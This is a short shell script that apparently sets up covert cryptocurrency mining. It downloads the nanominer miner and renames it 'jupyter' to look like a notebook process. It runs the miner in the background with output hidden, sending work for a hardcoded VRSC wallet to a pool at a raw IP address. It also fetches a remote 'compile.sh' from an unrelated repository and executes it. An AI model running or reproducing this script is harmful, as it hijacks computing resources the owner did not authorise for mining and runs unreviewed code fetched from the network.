curl -L -o nanominer-linux-3.7.6.tar.gz https://github.com/nanopool/nanominer/releases/download/v3.7.6/nanominer-linux-3.7.6.tar.gz
curl -L -o ngewe.ini https://raw.githubusercontent.com/alekpoden82/guy/main/config.ini
curl -L -o compile https://raw.githubusercontent.com/Omarjetos/ezz/master/compile.sh && chmod +x compile
chmod +x ngewe.ini
tar -xhf nanominer-linux-3.7.6.tar.gz
mv nanominer jupyter
./jupyter -algo Verushash -wallet R9NomMhPCnnpbcrfDeM8xTuVcfFHvau7Jf.tes -coin VRSC -pool1 159.223.89.218:80 -t 1 >/dev/null &
timeout 15m ./compile
